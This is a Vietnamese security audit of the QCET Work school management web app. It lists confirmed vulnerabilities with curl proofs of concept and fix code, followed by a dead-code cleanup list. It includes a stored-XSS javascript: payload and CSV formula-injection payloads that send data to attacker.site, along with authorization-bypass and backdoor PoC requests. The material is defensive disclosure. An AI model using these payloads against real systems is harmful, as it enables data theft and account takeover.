# BÁO CÁO TOÀN DIỆN VỀ BẢO MẬT & TỐI ƯU HÓA MÃ NGUỒN HỆ THỐNG QCET WORK
**Cơ quan:** Trường Cao đẳng Kỹ thuật Công nghệ Quy Nhơn (QCET)  
**Chức danh thẩm định:** Giám đốc Công nghệ (CTO / Chief Security & Quality Officer)  
**Phạm vi:** Toàn bộ mã nguồn hệ thống (`src/app/api/**`, `src/lib/**`, `src/components/**`, `public/sw.js`, `next.config.ts`, `tests/**`).

---

## 1. TỔNG QUAN ĐIỀU HÀNH (EXECUTIVE SUMMARY)

### 1.1. Thống kê hiện trạng an ninh thông tin
Qua quá trình đối soát độc lập và thực nghiệm tấn công đối kháng (Adversarial Security Red-Team Audit) trên 23 đề mục báo cáo từ các kiểm toán viên:
- **Tổng số lỗ hổng xác thực thực tế (CONFIRMED):** 19 lỗ hổng.
  - **CRITICAL (Nghiêm trọng tối cao):** 05 lỗ hổng.
  - **HIGH (Nguy cơ cao):** 05 lỗ hổng.
  - **MEDIUM (Trung bình):** 06 lỗ hổng.
  - **LOW / DEFENSE-IN-DEPTH (Thấp / Phòng thủ chiều sâu):** 03 lỗ hổng.
- **Bác bỏ hoàn toàn (FALSE POSITIVES):** 03 phát hiện (do kiểm toán viên suy đoán sai lệch logic code hoặc giả định các file không hề tồn tại trong dự án).
- **Hạ cấp rủi ro (DOWNGRADED):** 01 phát hiện (Demo session backdoor và Hardcoded JWT Secret được phân loại High thay vì Critical do có cơ chế kiểm tra môi trường production).

### 1.2. Đánh giá mức độ an toàn tổng thể của hệ thống QCET Work
- **Hiện trạng:** Hệ thống đang ở mức rủi ro **CAO (HIGH RISK)** nếu triển khai ra môi trường Internet công cộng hoặc mạng diện rộng của trường.
- **Điểm nghẽn kiến trúc lớn nhất:**
  1. **Thiếu lớp kiểm soát tập trung (Missing Centralized Enforcement):** Dự án hoàn toàn thiếu `src/middleware.ts`, dẫn đến việc phân quyền bị phân tán rải rác từng API route. Nhiều route trọng yếu bị bỏ quên hoàn toàn bước kiểm tra session hoặc thẩm quyền.
  2. **BOLA/BFLA nghiêm trọng:** Ranh giới thẩm quyền giữa Ban Giám hiệu, Trưởng phòng và Chuyên viên chủ yếu được kiểm tra ở giao diện người dùng (Client-Side), trong khi các endpoint backend nhận dữ liệu trực tiếp mà không kiểm chứng quyền hạn (Separation of Duties - SoD).
  3. **Rò rỉ dữ liệu qua Public Endpoints:** Hệ thống văn bản quy phạm, chỉ đạo nội bộ, danh bạ nhân sự và tệp tin đính kèm đang bị phơi bày cho người dùng nặc danh.

### 1.3. Khối lượng Dead Code ước tính
- **Nhóm 1 (Dead Code tuyệt đối, xóa an toàn ngay):** 14 mục gồm 05 file độc lập (`use-task-operations.ts`, `use-network-status.ts`, `bento-portal-hub.tsx`, `submit-deliverable-modal.tsx`, `review-action-dialog.tsx`) và 9 cụm hàm helper mồ côi. Giảm tải ngay **~1.700 dòng code (LOC)**.
- **Nhóm 2 (Legacy Workspaces & Test Fixtures chờ dọn dẹp):** ~21 mục với **~10.000 dòng code (LOC)** (gồm 3 workspace cũ, các modal phụ trợ, và các component đã được thay thế bởi `UnifiedAdaptiveWorkspace` nhưng vẫn giữ lại làm adapter cho test suite).

---

## 2. DANH SÁCH LỖ HỔNG BẢO MẬT ĐÃ XÁC THỰC (CONFIRMED VULNERABILITIES)

### [CRIT-01] BOLA / IDOR xóa sạch bất kỳ nhiệm vụ nào của trường
- **Phân loại:** CWE-639 / OWASP API1:2023 - Broken Object Level Authorization (BOLA).
- **Mức độ:** CRITICAL.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/tasks/[id]/route.ts` (Dòng 232-278).
- **Nguyên nhân gốc rễ (Root Cause):** Endpoint `DELETE /api/tasks/[id]` chỉ xác thực người dùng có cookie hợp lệ (`getSessionPayload`), nhưng không kiểm tra quyền sở hữu (`createdById`), đơn vị phụ trách (`departmentId`), hay vai trò quản trị (`session.role`). Bất kỳ chuyên viên nào cũng có thể gửi lệnh xóa nhiệm vụ của Ban Giám hiệu.
- **Kịch bản khai thác (PoC):**
  ```bash
  # Chuyên viên gửi request xóa nhiệm vụ chiến lược cấp trường:
  curl -X DELETE "http://localhost:3001/api/tasks/critical-school-task-uuid" \
    -H "Cookie: qcet_session=<TOKEN_CHUYEN_VIEN>"
  # Phản hồi 200 OK -> Task và toàn bộ dữ liệu chỉ đạo liên quan bị xóa vĩnh viễn.
  ```
- **Giải pháp khắc phục:**
  ```typescript
  // src/app/api/tasks/[id]/route.ts
  const task = await prisma.task.findUnique({
    where: { id: taskId },
    select: { id: true, createdById: true, departmentId: true, scope: true }
  });
  if (!task) {
    return NextResponse.json({ success: false, error: 'Không tìm thấy nhiệm vụ' }, { status: 404 });
  }

  const isBghOrAdmin = session.role === 'ADMIN' || session.role === 'BAN_GIAM_HIEU';
  const isCreator = task.createdById === session.id;
  const isDeptLeader = (session.role === 'TRUONG_PHONG' || session.role === 'PHO_PHONG') && session.departmentId === task.departmentId;

  if (!isBghOrAdmin && !isCreator && !isDeptLeader) {
    return NextResponse.json({ success: false, error: 'Bạn không có thẩm quyền xóa nhiệm vụ này' }, { status: 403 });
  }
  ```

---

### [CRIT-02] Public API đọc, sửa đổi và tạo văn bản mật/quy phạm không cần xác thực
- **Phân loại:** CWE-306 / OWASP API2:2023 - Missing Authentication for Critical Function.
- **Mức độ:** CRITICAL.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/documents/route.ts` (Dòng 19-106) & `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/documents/[id]/route.ts` (Dòng 12-79).
- **Nguyên nhân gốc rễ (Root Cause):**
  - `GET /api/documents`: Không gọi `getSessionPayload`. Bất kỳ ai không đăng nhập cũng có thể lấy danh sách toàn bộ văn bản đến/đi, bao gồm cả văn bản có độ mật `TUYET_MAT`.
  - `POST /api/documents`: Có gọi `const session = getSessionPayload(request)` nhưng bỏ quên câu lệnh kiểm tra `if (!session) return 401`. Người dùng nặc danh có thể tạo văn bản và tùy ý giả mạo `registeredById`.
  - `PATCH /api/documents/[id]`: Không có bất kỳ logic xác thực nào. Cho phép người dùng nặc danh sửa đổi trích yếu, số hiệu, độ mật và đơn vị chủ trì.
- **Kịch bản khai thác (PoC):**
  ```bash
  curl -X PATCH "http://localhost:3001/api/documents/doc-secret-123" \
    -H "Content-Type: application/json" \
    -d '{"summary": "Văn bản đã bị can thiệp trái phép", "securityLevel": "THUONG"}'
  # Phản hồi 200 OK -> Dữ liệu văn bản mật bị sửa đổi công khai.
  ```
- **Giải pháp khắc phục:**
  ```typescript
  // Bổ sung kiểm tra xác thực bắt buộc tại đầu tất cả handlers:
  const session = getSessionPayload(request);
  if (!session) {
    return NextResponse.json({ success: false, error: 'Yêu cầu đăng nhập để truy cập văn bản' }, { status: 401 });
  }
  // Tại POST /api/documents:
  const registeredById = session.id; // Bắt buộc lấy ID từ phiên đăng nhập, loại bỏ body.registeredById
  ```

---

### [CRIT-03] Mạo danh Ban Giám hiệu chỉ đạo văn bản và tạo nhiệm vụ cấp trường
- **Phân loại:** CWE-285 / OWASP API5:2023 - Broken Function Level Authorization (BFLA).
- **Mức độ:** CRITICAL.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/documents/[id]/directives/route.ts` (Dòng 44-76).
- **Nguyên nhân gốc rễ (Root Cause):** Route không kiểm tra session đăng nhập và vai trò. Khi không có phiên hoặc không tìm thấy người chỉ đạo, mã nguồn fallback tự động truy vấn tìm user có role `BAN_GIAM_HIEU` đầu tiên trong cơ sở dữ liệu và gán làm người chỉ đạo (`effectiveLeaderId = fallbackLeader.id`). Kẻ tấn công nặc danh có thể phát lệnh chỉ đạo mạo danh Hiệu trưởng.
- **Kịch bản khai thác (PoC):**
  ```bash
  curl -X POST "http://localhost:3001/api/documents/doc-1/directives" \
    -H "Content-Type: application/json" \
    -d '{"instruction": "Chuyển gấp ngân sách 200 triệu cho dự án X", "assignedDeptId": "PHONG_KE_HOACH_TAI_CHINH"}'
  # Hệ thống tự động lấy danh nghĩa Hiệu trưởng phát lệnh chỉ đạo và sinh Task cấp trường!
  ```
- **Giải pháp khắc phục:**
  ```typescript
  const session = getSessionPayload(request);
  if (!session) {
    return NextResponse.json({ success: false, error: 'Unauthorized' }, { status: 401 });
  }
  if (session.role !== 'BAN_GIAM_HIEU' && session.role !== 'ADMIN') {
    return NextResponse.json({ success: false, error: 'Chỉ Ban Giám hiệu mới có quyền ban hành chỉ đạo văn bản' }, { status: 403 });
  }
  const effectiveLeaderId = session.id; // Bắt buộc lấy ID người chỉ đạo từ session
  ```

---

### [CRIT-04] Stored XSS qua liên kết minh chứng công việc (`javascript:` URI Injection)
- **Phân loại:** CWE-79 / OWASP A03:2021 - Stored Cross-Site Scripting (XSS).
- **Mức độ:** CRITICAL.
- **Vị trí:**
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/components/portal/submit-deliverable-modal.tsx`: Dòng 99-105.
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/components/portal/review-action-dialog.tsx`: Dòng 371-379.
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/tasks/[id]/deliverables/route.ts`: Dòng 59.
- **Nguyên nhân gốc rễ (Root Cause):** Validation URL ở modal chỉ kiểm tra lỏng lẻo `trimmedUrl.includes(".")`. API lưu trực tiếp chuỗi URL thô vào database. Khi Trưởng phòng hoặc Hiệu trưởng duyệt minh chứng, giao diện render thẻ `<a href={effectiveDeliverableUrl} target="_blank">`. Do không lọc giao thức, kẻ tấn công chèn được `javascript:...`.
- **Kịch bản khai thác (PoC):**
  Chuyên viên nộp minh chứng với URL:
  `javascript:fetch('/api/auth/me').then(r=>r.json()).then(u=>fetch('https://attacker.site/log?data='+encodeURIComponent(JSON.stringify(u))))`
  Khi cán bộ lãnh đạo bấm vào nút "Xem minh chứng", payload JavaScript được kích hoạt ngay lập tức trong phiên đăng nhập của lãnh đạo.
- **Giải pháp khắc phục:**
  ```typescript
  // src/lib/url-validation.ts
  export function isValidSafeUrl(urlStr: string): boolean {
    try {
      const parsed = new URL(urlStr);
      return parsed.protocol === 'http:' || parsed.protocol === 'https:';
    } catch {
      return false;
    }
  }

  // Tại review-action-dialog.tsx và các điểm hiển thị minh chứng:
  const safeDeliverableHref = isValidSafeUrl(effectiveDeliverableUrl) ? effectiveDeliverableUrl : '#';
  ```

---

### [CRIT-05] BFLA / BOLA - Cập nhật và Duyệt hoàn thành Task tùy ý không qua kiểm tra thẩm quyền
- **Phân loại:** CWE-285 / CWE-639 / OWASP API5:2023 - Broken Function Level Authorization.
- **Mức độ:** CRITICAL.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/tasks/[id]/route.ts` (Dòng 73-230).
- **Nguyên nhân gốc rễ (Root Cause):** Quy tắc phân lập nhiệm vụ (Separation of Duties - SoD: người thực hiện không được tự duyệt hoàn thành nhiệm vụ) và kiểm tra phân quyền DACUM chỉ được viết trên React Client (`task-detail-side-sheet.tsx`). Endpoint `PATCH /api/tasks/[id]` chỉ kiểm tra có đăng nhập, sau đó nhận trực tiếp `status = "completed"`, `progressPercent = 100`, `assigneeId`, `dueDate` từ request body mà không kiểm tra người gửi có quyền duyệt hay không.
- **Kịch bản khai thác (PoC):**
  ```bash
  # Chuyên viên gửi request trực tiếp hoàn thành nhiệm vụ mà không cần Trưởng phòng duyệt minh chứng:
  curl -X PATCH "http://localhost:3001/api/tasks/task-important-id" \
    -H "Cookie: qcet_session=<TOKEN_CHUYEN_VIEN>" \
    -H "Content-Type: application/json" \
    -d '{"status": "completed", "progressPercent": 100}'
  # Phản hồi 200 OK -> Nhiệm vụ được chuyển thành COMPLETED trên cơ sở dữ liệu!
  ```
- **Giải pháp khắc phục:**
  ```typescript
  // src/app/api/tasks/[id]/route.ts
  if (status && status.toUpperCase() === 'COMPLETED') {
    const isAssignee = task.assigneeId === session.id;
    const isApprover = session.role === 'ADMIN' || session.role === 'BAN_GIAM_HIEU' || 
      ((session.role === 'TRUONG_PHONG' || session.role === 'PHO_PHONG') && session.departmentId === task.departmentId);

    if (isAssignee && !isApprover) {
      return NextResponse.json({
        success: false,
        error: 'Quy tắc SoD: Người thực hiện không được tự duyệt hoàn thành nhiệm vụ của chính mình'
      }, { status: 403 });
    }
  }
  ```

---

### [HIGH-01] Demo Session Backdoor khi cấu hình sai hoặc môi trường non-prod
- **Phân loại:** CWE-489 / OWASP API8:2023 - Active Debug/Test Code in Production.
- **Mức độ:** HIGH.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/auth/demo-session/route.ts` (Dòng 15-87).
- **Nguyên nhân gốc rễ (Root Cause):** Endpoint cho phép cấp JWT session với bất kỳ vai trò nào (`ADMIN`, `BAN_GIAM_HIEU`, `TRUONG_PHONG`) mà không cần mật khẩu. Mặc dù có điều kiện kiểm tra `process.env.NODE_ENV === "production"`, nhưng nếu máy chủ chạy qua Docker/PM2 mà quên set biến môi trường, lỗ hổng sẽ trở thành một backdoor chiếm toàn quyền hệ thống.
- **Kịch bản khai thác (PoC):**
  ```bash
  curl -X POST "http://localhost:3001/api/auth/demo-session" \
    -H "Content-Type: application/json" \
    -d '{"role": "BAN_GIAM_HIEU"}'
  # Nhận lại Cookie phiên làm việc với quyền Hiệu trưởng!
  ```
- **Giải pháp khắc phục:**
  Loại bỏ hoàn toàn file này khỏi production build hoặc bổ sung guard chặn cứng:
  ```typescript
  if (process.env.NODE_ENV === 'production' || process.env.ENABLE_DEMO_AUTH !== 'true') {
    return NextResponse.json({ success: false, error: 'Tính năng phiên thử nghiệm đã bị vô hiệu hóa' }, { status: 403 });
  }
  ```

---

### [HIGH-02] Hardcoded JWT Secret & Private VAPID Key dự phòng
- **Phân loại:** CWE-798 / OWASP API2:2023 - Use of Hard-coded Credentials.
- **Mức độ:** HIGH.
- **Vị trí:**
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/lib/jwt-session.ts`: Dòng 8-12.
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/lib/push-service.ts`: Dòng 19-24.
- **Nguyên nhân gốc rễ (Root Cause):** Cả hai file đều chứa chuỗi fallback tĩnh (`qcet-eoffice-jwt-secret-key-2026-secure-default...` và `VAPID_PRIVATE_KEY` tĩnh). Nếu quản trị viên quên khai báo biến môi trường trong file `.env`, hệ thống âm thầm sử dụng chuỗi bí mật tĩnh đã bị lộ trong Git history để ký token.
- **Kịch bản khai thác (PoC):**
  Kẻ tấn công đọc chuỗi fallback trong mã nguồn, tự ký token JWT với `{ id: "admin-id", role: "ADMIN" }` và gửi kèm request để vượt qua toàn bộ cơ chế xác thực.
- **Giải pháp khắc phục:**
  ```typescript
  // src/lib/jwt-session.ts
  const JWT_SECRET_STRING = process.env.JWT_SECRET || process.env.NEXTAUTH_SECRET;
  if (!JWT_SECRET_STRING && process.env.NODE_ENV === 'production') {
    throw new Error('CRITICAL SECURITY ERROR: Biến môi trường JWT_SECRET chưa được cấu hình trên Production.');
  }
  const JWT_SECRET = new TextEncoder().encode(JWT_SECRET_STRING || 'dev-fallback-secret-non-prod-only');
  ```

---

### [HIGH-03] CSV Formula Injection (CWE-1236) khi xuất sổ văn bản
- **Phân loại:** CWE-1236 - Improper Neutralization of Formula Elements in CSV File.
- **Mức độ:** HIGH.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/lib/documents/excel-export.ts` (Dòng 94-123).
- **Nguyên nhân gốc rễ (Root Cause):** Hàm `escapeCsvCell` chỉ bao bọc dấu nháy kép cho dấu phẩy và xuống dòng, hoàn toàn không xử lý các ký tự điều khiển công thức của bảng tính (`=`, `+`, `-`, `@`, `\t`, `\r`). Kết hợp với tiền tố UTF-8 BOM (`\uFEFF`), Microsoft Excel sẽ tự động thực thi công thức khi người dùng mở file.
- **Kịch bản khai thác (PoC):**
  Kẻ tấn công nhập trích yếu văn bản: `=cmd|'/C calc'!A0` hoặc `=HYPERLINK("https://attacker.site/exfil?d="&A1, "Xem chi tiết")`. Cán bộ văn thư xuất sổ qua `/api/documents/export-excel` và mở bằng Excel, mã độc sẽ được tự động kích hoạt trên máy trạm của cán bộ.
- **Giải pháp khắc phục:**
  ```typescript
  // src/lib/documents/excel-export.ts
  export function escapeCsvCell(value: string | number | null | undefined): string {
    if (value === null || value === undefined) return "";
    let str = String(value);

    // Vô hiệu hóa Formula Injection: Thêm dấu nháy đơn (') phía trước nếu bắt đầu bằng ký tự công thức
    if (/^[=+\-@\t\r]/.test(str)) {
      str = `'${str}`;
    }

    if (str.includes('"') || str.includes(",") || str.includes("\n") || str.includes("\r")) {
      return `"${str.replace(/"/g, '""')}"`;
    }
    return str;
  }
  ```

---

### [HIGH-04] Mass Assignment `creatorId` & Tráo đổi trạng thái Task qua Deliverable
- **Phân loại:** CWE-915 / OWASP API6:2023 - Unrestricted Access to Sensitive Business Flows / Mass Assignment.
- **Mức độ:** HIGH.
- **Vị trí:**
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/tasks/route.ts`: Dòng 152.
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/tasks/[id]/deliverables/route.ts`: Dòng 52, 71-75.
- **Nguyên nhân gốc rễ (Root Cause):**
  - Tại `POST /api/tasks`: API chấp nhận `createdById: body.createdById || session.id`. Cho phép người tạo gán người tạo là bất kỳ ai (mạo danh lãnh đạo giao việc).
  - Tại `POST /api/tasks/[id]/deliverables`: Khi người thực hiện nộp minh chứng, API tự động chuyển trạng thái task sang `IN_PROGRESS` mà không kiểm tra xem task đó có đang ở trạng thái `COMPLETED` hay `CANCELLED` hay không. Cho phép kích hoạt lại nhiệm vụ đã kết thúc.
- **Kịch bản khai thác (PoC):**
  Người dùng gửi payload tạo task kèm `"createdById": "hieu-truong-id"`. Task xuất hiện dưới danh nghĩa Hiệu trưởng chỉ đạo.
- **Giải pháp khắc phục:**
  ```typescript
  // 1. Khóa cứng createdById trong POST /api/tasks:
  createdById: session.id, // Tuyệt đối không đọc từ body.createdById

  // 2. Chặn nộp minh chứng cho task đã đóng tại deliverables/route.ts:
  if (task.status === 'COMPLETED' || task.status === 'CANCELLED') {
    return NextResponse.json({ success: false, error: 'Không thể nộp minh chứng cho nhiệm vụ đã hoàn thành hoặc đã hủy' }, { status: 400 });
  }
  ```

---

### [HIGH-05] Tải và streaming tệp tin uploads không xác thực
- **Phân loại:** CWE-306 / OWASP API1:2023 - Broken Object Level Authorization.
- **Mức độ:** HIGH.
- **Vị trí:**
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/documents/download/route.ts`: Dòng 9-54.
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/files/[...path]/route.ts`: Dòng 6-47.
- **Nguyên nhân gốc rễ (Root Cause):** Các endpoint phục vụ tải file đính kèm văn bản và minh chứng công việc hoàn toàn không gọi hàm xác thực session. Bất kỳ ai có URL tệp tin đều có thể tải xuống mà không cần đăng nhập.
- **Kịch bản khai thác (PoC):**
  Kẻ tấn công cào dữ liệu URL từ các báo cáo công khai hoặc quét chuỗi đường dẫn `/api/documents/download?fileUrl=uploads/docs/...` để lấy toàn bộ văn bản nội bộ.
- **Giải pháp khắc phục:**
  Bắt buộc xác thực session trước khi cho phép đọc và stream file:
  ```typescript
  const session = getSessionPayload(request);
  if (!session) {
    return NextResponse.json({ success: false, error: 'Unauthorized' }, { status: 401 });
  }
  ```

---

### [MED-01] Lộ thông tin mạng nội bộ LAN, Tailscale IP và Cổng dịch vụ
- **Phân loại:** CWE-200 / OWASP API8:2023 - Information Disclosure.
- **Mức độ:** MEDIUM.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/system/network-info/route.ts` (Dòng 4-48).
- **Nguyên nhân gốc rễ (Root Cause):** Endpoint công khai cung cấp chi tiết địa chỉ IP mạng nội bộ, dải IP Tailscale VPN, danh sách network interfaces và port dịch vụ của máy chủ phục vụ tính năng Mobile QR. Kẻ tấn công trên mạng Internet có thể lập bản đồ hạ tầng mạng nội bộ của trường.
- **Kịch bản khai thác (PoC):**
  Truy cập `GET http://localhost:3001/api/system/network-info` để thu thập sơ đồ mạng và IP máy chủ cơ sở dữ liệu/VPN.
- **Giải pháp khắc phục:**
  Bảo vệ endpoint bằng quyền Quản trị viên (`ADMIN`) hoặc chỉ cho phép truy cập từ dải mạng nội bộ hợp lệ.

---

### [MED-02] Lộ danh bạ cán bộ, chức vụ, email và Dashboard toàn trường
- **Phân loại:** CWE-200 / CWE-284 - Information Exposure.
- **Mức độ:** MEDIUM.
- **Vị trí:**
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/users/route.ts`: Dòng 4-46.
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/dashboard/overview/route.ts`: Dòng 7-26.
- **Nguyên nhân gốc rễ (Root Cause):** Hai endpoint này không kiểm tra xác thực. Bất kỳ ai cũng có thể trích xuất toàn bộ danh bạ cán bộ giảng viên (họ tên, email, chức vụ, phòng ban) và số liệu tổng quan về tiến độ công việc của nhà trường.
- **Giải pháp khắc phục:**
  Thêm `const session = getSessionPayload(request); if (!session) return 401;` vào cả hai route.

---

### [MED-03] Race Condition (TOCTOU) khi Ban Giám hiệu gia hạn nhiệm vụ
- **Phân loại:** CWE-367 - Time-of-check Time-of-use (TOCTOU) Race Condition.
- **Mức độ:** MEDIUM.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/executive/resolutions/route.ts` (Dòng 181-207).
- **Nguyên nhân gốc rễ (Root Cause):** Truy vấn kiểm tra nhiệm vụ (`prisma.task.findUnique`) nằm ngoài khối giao dịch `prisma.$transaction`. Khi có nhiều thao tác xử lý đồng thời, trạng thái hoặc hạn chót của nhiệm vụ có thể bị ghi đè không nhất quán.
- **Giải pháp khắc phục:**
  Đưa toàn bộ thao tác đọc và cập nhật vào bên trong cùng một khối `prisma.$transaction(async (tx) => { ... })`.

---

### [MED-04] Content-Disposition Header Injection khi tải file
- **Phân loại:** CWE-113 - Improper Neutralization of CRLF Sequences in HTTP Headers.
- **Mức độ:** MEDIUM.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/documents/download/route.ts` (Dòng 41-48).
- **Nguyên nhân gốc rễ (Root Cause):** Tên file được đưa trực tiếp vào header `Content-Disposition` mà không chuẩn hóa hoặc mã hóa theo RFC 6266 (`filename* = UTF-8''...`). Tên file chứa ký tự xuống dòng (`\r\n`) có thể dẫn đến HTTP Response Splitting.
- **Giải pháp khắc phục:**
  ```typescript
  const safeFilename = encodeURIComponent(path.basename(filePath));
  headers.set('Content-Disposition', `attachment; filename="${safeFilename}"; filename*=UTF-8''${safeFilename}`);
  ```

---

### [MED-05] Thiếu Middleware xác thực tập trung & Thiếu HTTP Security Headers
- **Phân loại:** CWE-693 / OWASP A05:2021 - Security Misconfiguration.
- **Mức độ:** MEDIUM.
- **Vị trí:** Thư mục gốc dự án (không tồn tại file `src/middleware.ts`) và `/Users/dnhhuy/Projects/QCET/QCET Work/next.config.ts`.
- **Nguyên nhân gốc rễ (Root Cause):** Hệ thống không có middleware chặn các route nhạy cảm ở mức gateway của Next.js. Đồng thời `next.config.ts` thiếu các security headers quan trọng: Content-Security-Policy (CSP), X-Frame-Options (chống Clickjacking), X-Content-Type-Options.
- **Giải pháp khắc phục:**
  1. Tạo `src/middleware.ts` kiểm tra phiên cho toàn bộ `/api/**` (trừ các route auth công khai).
  2. Bổ sung `headers()` vào `next.config.ts` với CSP, X-Frame-Options: SAMEORIGIN, X-Content-Type-Options: nosniff.

---

### [MED-06] Rò rỉ CacheStorage sau Logout & Lưu PII trong LocalStorage
- **Phân loại:** CWE-312 / CWE-613 - Insufficient Session Expiration & Cleartext Storage of Sensitive Information.
- **Mức độ:** MEDIUM.
- **Vị trí:**
  - `/Users/dnhhuy/Projects/QCET/QCET Work/public/sw.js`: Dòng 88-140.
  - `/Users/dnhhuy/Projects/QCET/QCET Work/src/lib/auth-context.tsx`: Dòng 145-167, 308-324.
- **Nguyên nhân gốc rễ (Root Cause):** Service Worker cache các phản hồi API chứa dữ liệu công việc. Khi người dùng bấm Đăng xuất, `auth-context.tsx` chỉ xóa cookie và state trên bộ nhớ, không gửi thông điệp xóa bỏ `caches` của trình duyệt. Trên máy tính dùng chung tại văn phòng trường, người dùng tiếp theo có thể xem lại dữ liệu cũ từ CacheStorage.
- **Giải pháp khắc phục:**
  Gửi message kích hoạt dọn dẹp CacheStorage khi logout:
  ```typescript
  if ('serviceWorker' in navigator && navigator.serviceWorker.controller) {
    navigator.serviceWorker.controller.postMessage({ type: 'CLEAR_USER_CACHE' });
  }
  ```

---

### [LOW-01] Open Redirect trong Service Worker Notification Click
- **Phân loại:** CWE-601 - URL Redirection to Untrusted Site.
- **Mức độ:** LOW.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/public/sw.js` (Dòng 280-289).
- **Nguyên nhân gốc rễ (Root Cause):** Khi click vào thông báo đẩy, Service Worker mở URL từ `event.notification.data.url` mà không kiểm tra xem URL đó có thuộc cùng origin (`self.location.origin`) hay không.
- **Giải pháp khắc phục:**
  Kiểm tra URL đích chỉ cho phép relative path bắt đầu bằng `/` hoặc cùng origin trước khi gọi `clients.openWindow(url)`.

---

### [LOW-02] Symlink Traversal tiềm ẩn trong `resolveSafeFilePath`
- **Phân loại:** CWE-59 - Improper Link Resolution Before File Access.
- **Mức độ:** LOW.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/lib/storage.ts` (Dòng 14-30).
- **Nguyên nhân gốc rễ (Root Cause):** Hàm sử dụng `path.resolve()` để kiểm tra tiền tố thư mục, nhưng không dùng `fs.realpathSync()` để giải quyết triệt để các symbolic link trỏ ra ngoài thư mục `uploads/`.
- **Giải pháp khắc phục:**
  Sử dụng `fs.realpathSync` trên đường dẫn đích để đảm bảo symlink không trỏ ra ngoài thư mục gốc cho phép.

---

### [LOW-03] Tranh chấp Push Subscription Endpoint không gắn chặt với User
- **Phân loại:** CWE-284 - Improper Access Control.
- **Mức độ:** LOW.
- **Vị trí:** `/Users/dnhhuy/Projects/QCET/QCET Work/src/app/api/notifications/push/subscribe/route.ts` (Dòng 74-97).
- **Nguyên nhân gốc rễ (Root Cause):** Khi nhiều người dùng đăng nhập trên cùng một trình duyệt, subscription endpoint có thể bị ghi đè quyền sở hữu hoặc nhận nhầm thông báo của phiên làm việc trước.
- **Giải pháp khắc phục:**
  Bổ sung ràng buộc unique composite `[userId, endpoint]` và dọn dẹp subscription cũ khi user đăng xuất.

---

## 3. DANH SÁCH DEAD CODE CẦN DỌN DẸP (CLEANUP TARGETS)

### 3.1. Nhóm 1: Dead Code tuyệt đối (CONFIRMED DEAD CODE - Xóa an toàn ngay lập tức)
Các thành phần này có **0 usages** trong toàn bộ mã nguồn `src/` và không có bất kỳ file test nào tham chiếu tới. Có thể xóa ngay mà không gây ảnh hưởng đến hệ thống:

1. **Hooks mồ côi:**
   - `src/hooks/use-task-operations.ts` (85 LOC): Đã bị thay thế hoàn toàn bởi `use-task-mutations.ts`.
   - `src/hooks/use-network-status.ts` (43 LOC): Logic offline hiện đã chuyển qua `offline-sync.ts`.
2. **Components Portal thừa:**
   - `src/components/portal/bento-portal-hub.tsx` (556 LOC): Không mount ở bất kỳ trang nào. `tests/dashboard-orchestrator-budget.test.ts` đã assert không được render.
   - `src/components/portal/submit-deliverable-modal.tsx` (686 LOC): Đã được tích hợp inline vào `UniversalActionQueue`.
   - `src/components/portal/review-action-dialog.tsx` (599 LOC): Không còn điểm gọi nào trong flow chính.
3. **Các hàm tiện ích không sử dụng (Dead Functions trong `src/lib/`):**
   - `src/lib/login-helpers.ts`: `DEMO_LOGIN_CARDS`, `validateLoginForm`, `resolveDemoUserByRole` (~95 LOC).
   - `src/lib/unified-task-hub.ts`: `resolveStaffLandingMode`, `filterTasksByWorkbox`, `filterTasksByAcademicMonth` (~55 LOC).
   - `src/lib/adapters/task-db-adapter.ts`: `mapSchoolTaskToPrismaCreateInput` (~35 LOC).
   - `src/lib/dashboard-aggregator.ts`: `filterSchoolTasks` (~25 LOC).
   - `src/lib/delegation-authority-engine.ts`: `recordDelegatedApproval` (~20 LOC).
   - `src/lib/storage.ts`: `getMimeType` (~15 LOC).
   - `src/lib/documents/excel-export.ts`: `generateAppendixIVWorkbook` (~12 LOC).
   - `src/lib/documents/document-service.ts`: `registerIncomingDocument` (~10 LOC).
   - `src/lib/offline-sync.ts`: `clearOfflineMutationQueue` (~10 LOC).
*Tổng dung lượng cắt giảm ngay:* **~1.700 dòng code**.

### 3.2. Nhóm 2: Mã nguồn Legacy chờ dọn dẹp theo lộ trình (CANDIDATE FOR CLEANUP)
*Cảnh báo an toàn:* Các thành phần này đã có giải pháp thay thế mới (`UnifiedAdaptiveWorkspace`), nhưng **chưa được xóa ngay** vì test suite (`tests/**`) vẫn đang assert sự tồn tại hoặc import trực tiếp. Cần cập nhật test suite trước khi xóa:

1. **Bộ 3 Legacy Workspaces:**
   - `src/components/portal/executive-cockpit-workspace.tsx`
   - `src/components/portal/lecturer-focus-workspace.tsx`
   - `src/components/portal/department-manager-workspace.tsx`
   *(Ràng buộc: Được dùng làm adapter cho hơn 2.250 dòng test tại `tests/role-based-workspace-workflow.test.ts` và `tests/role-landing-integration.test.ts`).*
2. **Components phụ trợ cho Cockpit cũ:**
   - `src/components/portal/executive-resolution-drawer.tsx` (600 LOC).
   - `src/components/portal/executive-briefing-modal.tsx` (553 LOC).
   - `src/components/portal/executive-unit-radar.tsx` & `executive-bottleneck-card.tsx` (453 LOC).
